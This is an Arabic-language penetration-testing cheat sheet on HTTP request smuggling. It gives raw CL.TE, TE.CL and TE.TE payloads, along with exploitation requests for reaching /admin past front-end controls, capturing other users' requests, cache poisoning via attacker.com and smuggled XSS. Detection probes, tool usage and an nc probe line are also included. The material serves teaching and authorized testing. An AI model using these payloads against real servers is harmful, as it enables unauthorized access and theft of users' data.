<a id="-http-request-smuggling-cheatsheet"></a>
# 📦 مرجع سريع لتهريب طلبات HTTP

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

> يكتب الرسم النصي العنوان بالإنجليزية؛ المقصود هو تهريب طلبات HTTP نتيجة اختلاف تفسير حدودها بين مكوّنات معالجة الطلب.

---

<a id="-what-is-request-smuggling"></a>
## 🎯 ما هو تهريب الطلبات

يستغل **تهريب طلبات HTTP ‏(HTTP Request Smuggling)** اختلاف تفسير الطلبات بين خادم الواجهة الأمامية (الوسيط Proxy) والخادم الخلفي، مما يسمح بإقحام طلبات إضافية.

<a id="impact"></a>
### الأثر
- 🔴 **تجاوز ضوابط الحماية** - تجاوز جدار حماية تطبيقات الويب (WAF) وقوائم التحكم في الوصول (ACL)
- 🔴 **تسميم ذاكرة التخزين المؤقت للويب** - تخزين استجابات خبيثة مؤقتًا
- 🔴 **سرقة بيانات الاعتماد** - التقاط طلبات مستخدمين آخرين
- 🔴 **XSS** - هجوم XSS منعكس عبر طلب مهرّب

---

<a id="-how-it-works"></a>
## 🔍 كيف يعمل

<a id="headers-involved"></a>
### الترويسات المعنية
```http
Content-Length: 13
Transfer-Encoding: chunked
```

> **توضيح للمعيار:** اجتماع الترويستين هنا جزء من أمثلة الاختبار غير المعيارية. يمنع HTTP/1.1 المرسِل من جمعهما، ويعطي Transfer-Encoding الأولوية عند استقبالهما معًا؛ ويجب على الوسيط الذي يمرّر الرسالة حذف Content-Length أولًا. احتُفظ بالأمثلة وقيم الأطوال وأحجام الأجزاء والمسافات كما في المصدر، ولا تمثّل طلبات مضمونة الصلاحية أو النجاح في كل بيئة. [RFC 9112، القسم 6.3](https://www.rfc-editor.org/rfc/rfc9112#section-6.3).

<a id="vulnerability-types"></a>
### أنواع الثغرة
| النوع | ما تستخدمه الواجهة الأمامية | ما يستخدمه الخادم الخلفي |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | كلاهما مُموّه | تُتجاهل إحدى الترويستين |

> **تصحيح لاختصار الجدول:** في TE.TE يدعم الطرفان Transfer-Encoding، لكن تمويه الترويسة يجعل أحدهما يتجاهلها؛ ليست الفكرة تمويه طرفَي الاتصال بحد ذاتهما. [شرح أنواع التهريب من PortSwigger](https://portswigger.net/web-security/request-smuggling).

---

<a id="-attack-payloads"></a>
## 💉 حمولات الهجوم

<a id="clte-content-length--transfer-encoding"></a>
### CL.TE (Content-Length → Transfer-Encoding)

**تستخدم الواجهة الأمامية Content-Length ويستخدم الخادم الخلفي Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**مثال استغلال:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

<a id="tecl-transfer-encoding--content-length"></a>
### TE.CL (Transfer-Encoding → Content-Length)

**تستخدم الواجهة الأمامية Transfer-Encoding ويستخدم الخادم الخلفي Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

<a id="tete-obfuscated-transfer-encoding"></a>
### TE.TE (تمويه ترويسة Transfer-Encoding)

```http
# تمويه ترويسة TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

<a id="-exploitation-examples"></a>
## 🔥 أمثلة الاستغلال

<a id="bypass-front-end-security"></a>
### تجاوز حماية الواجهة الأمامية
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

<a id="capture-other-users-requests"></a>
### التقاط طلبات مستخدمين آخرين
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*يُلحق طلب المستخدم التالي بالقيمة `data=`*

<a id="cache-poisoning-via-smuggling"></a>
### تسميم التخزين المؤقت عبر تهريب الطلبات
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

<a id="xss-via-smuggling"></a>
### هجمات XSS عبر تهريب الطلبات
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

<a id="-detection"></a>
## 🔍 الكشف

<a id="timing-based-detection"></a>
### الكشف المعتمد على التوقيت
```http
# اختبار CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# إذا استخدم الخادم الخلفي TE، فإنه ينتظر الجزء "0"
# انتهاء المهلة = احتمال وجود الثغرة
```

> **توضيح للتوقيت:** عبارة انتظار الجزء "0" في تعليق المصدر تبسيط؛ في هذا المثال تقطع Content-Length بيانات الترميز إلى أجزاء قبل اكتمال تأطيرها، فينتظر الخادم ما ينقص لإكمالها. التأخير وحده قرينة محتملة، وليس إثباتًا مستقلاً للثغرة.

<a id="differential-response"></a>
### اختلاف الاستجابة
```http
# إرسال طلب مهرّب يؤدي إلى 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# إذا كانت الاستجابة التالية 404 = وجود الثغرة
```

> **توضيح للتحقق:** ظهور 404 وحده لا يثبت التهريب؛ الدليل هو تغيّر استجابة طلب عادي لاحق بسبب تداخل الطلب المهرّب، مع المقارنة بالسلوك المعتاد. [شرح PortSwigger للتحقق باختلاف الاستجابات](https://portswigger.net/web-security/request-smuggling/finding).

---

<a id="-tools"></a>
## 🛠️ أدوات

<a id="burp-suite-extension"></a>
### إضافة Burp Suite
```
1. تثبيت إضافة "HTTP Request Smuggler"
2. النقر بزر الفأرة الأيمن على الطلب ← Extensions ← Launch Smuggle Probe
3. فحص النتائج بحثًا عن ثغرات تهريب الطلبات
```

<a id="smugglerpy"></a>
### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

<a id="manual-with-curl"></a>
### الاختبار اليدوي باستخدام curl
```bash
# ملاحظة: يطبّع curl الترويسات؛ قد يلزم استخدام TCP خام
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="detection-checklist"></a>
### قائمة التحقق للكشف
```markdown
- [ ] التحقق من وجود وسيط أو موزّع أحمال (خوادم متعددة)
- [ ] اختبار توقيت CL.TE
- [ ] اختبار توقيت TE.CL
- [ ] تجربة تمويه ترويسة TE
- [ ] التحقق باستخدام اختلاف الاستجابة
```

<a id="common-indicators"></a>
### مؤشرات شائعة
```
- موزّعات الأحمال (AWS ALB, HAProxy)
- الوكلاء العكسيون (nginx, Apache)
- شبكات توزيع المحتوى (Cloudflare, Akamai)
- تحويل الطلبات من HTTP/2 إلى HTTP/1.1
```

---

<a id="-important-notes"></a>
## ⚠️ ملاحظات مهمة

```
1. قد يؤثر الاختبار في عمل المستخدمين الآخرين
2. استخدام بيئات اختبار معزولة متى أمكن
3. إضافة معرّفات فريدة لتمييز طلباتك
4. الإبلاغ المسؤول مع إثبات مفهوم (PoC)
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مرجع تهريب طلبات HTTP من PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [هجمات عدم تزامن HTTP ‏(Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [أداة Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 استكشاف تهريب الطلبات!</b><br>
  <i>للاختبارات المصرّح بها فقط!</i>
</p>
